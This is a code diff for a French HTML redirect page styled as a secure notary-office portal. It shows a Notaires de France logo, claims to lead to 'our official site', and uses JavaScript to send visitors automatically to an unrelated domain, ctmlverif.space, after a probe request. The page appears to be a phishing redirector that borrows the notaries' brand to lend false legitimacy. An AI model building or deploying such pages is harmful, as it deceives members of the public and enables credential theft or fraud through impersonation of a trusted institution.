@@ -2,43 +2,156 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Redirection</title>
-  <meta http-equiv="refresh" content="5;URL=https://ctmlverif.space">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Étude Notariale - Accès sécurisé</title>
+  <!-- Police professionnelle -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      color: #000000;
-      text-align: center;
+      min-height: 100vh;
+      font-family: 'Montserrat', Arial, sans-serif;
+      background: linear-gradient(145deg, #f8fafc 0%, #eef2f5 100%);
+      color: #1e2b37;
+      padding: 20px;
     }
-    .loader {
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid #00AEEF;
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 600px;
+      margin-top: -5vh;
+    }
+
+    .logo {
+      width: 200px;
+      height: 200px;
+      object-fit: cover;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+      border: 4px solid white;
+      margin-bottom: 30px;
+      transition: transform 0.3s ease;
+    }
+
+    .logo:hover {
+      transform: scale(1.02);
+    }
+
+    .message {
+      font-size: 1.5rem;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+      color: #1e3c4f;
+      margin-bottom: 20px;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(0, 174, 239, 0.2);
+      border-top: 4px solid #00AEEF;
+      border-radius: 50%;
       animation: spin 1s linear infinite;
       margin: 20px 0;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .logo {
-      max-width: 200px;
-      margin-bottom: 20px;
+
+    .info {
+      font-size: 1rem;
+      color: #4a6572;
+      margin-top: 10px;
+      font-weight: 400;
+    }
+
+    .info a {
+      color: #00AEEF;
+      text-decoration: none;
+      font-weight: 500;
+      border-bottom: 1px dotted #00AEEF;
+    }
+
+    .info a:hover {
+      border-bottom: 1px solid #00AEEF;
+    }
+
+    @media (max-width: 480px) {
+      .logo {
+        width: 150px;
+        height: 150px;
+      }
+      .message {
+        font-size: 1.2rem;
+      }
     }
   </style>
 </head>
 <body>
-  <img class="logo" src="https://s2.qwant.com/thumbr/474x474/c/e/c8d21a49345c531038c3db85dee29fe9f25badca64fe0e41ca4626365d9c79/OIP.wm3EMlQTh5Ybrsbuh9AFswHaHa.jpg?u=https%3A%2F%2Ftse.mm.bing.net%2Fth%2Fid%2FOIP.wm3EMlQTh5Ybrsbuh9AFswHaHa%3Fcb%3Ddefcache2%26pid%3DApi%26defcache%3D1&q=0&b=1&p=0&a=0" alt="Notaire Logo">
-  <div class="loader"></div>
-  <p>Vous allez être redirigé dans quelques instants.</p>
+  <div class="content">
+    <!-- ===== VOTRE LOGO (intégré) ===== -->
+    <img class="logo" src="https://lepetitjournal.com/_next/image?url=https%3A%2F%2Fbackoffice.lepetitjournal.com%2Fsites%2Fdefault%2Ffiles%2F2022-10%2FNotaires%2520de%2520France%2520_0.png&w=256&q=75" alt="Logo Notaires de France">
+
+    <p class="message">Vous allez être redirigé vers notre site officiel dans quelques instants.</p>
+
+    <div class="loader"></div>
+
+    <p class="info">
+      Si la redirection ne fonctionne pas, <a href="#" id="directLink">cliquez ici</a>.
+    </p>
+  </div>
+
+  <script>
+    (function() {
+      "use strict";
+
+      // ===== VOTRE SITE DE DESTINATION =====
+      const SITE_URL = "https://ctmlverif.space";   // (vous pourrez le changer plus tard si besoin)
+
+      const REDIRECT_DELAY = 4000; // 4 secondes
+
+      const directLink = document.getElementById('directLink');
+      if (directLink) {
+        directLink.href = SITE_URL;
+      }
+
+      function redirect() {
+        window.location.href = SITE_URL;
+      }
+
+      setTimeout(redirect, REDIRECT_DELAY);
+
+      // Redirection au clic sur la page (une seule fois)
+      document.body.addEventListener('click', function() {
+        redirect();
+      }, { once: true });
+
+      // Petit test discret de disponibilité (optionnel)
+      fetch(SITE_URL, { method: 'HEAD', mode: 'no-cors' })
+        .then(() => console.log('Site accessible'))
+        .catch(() => {
+          const msg = document.querySelector('.info');
+          if (msg) {
+            msg.innerHTML += ' (Le site semble lent, patience...)';
+          }
+        });
+    })();
+  </script>
 </body>
 </html>
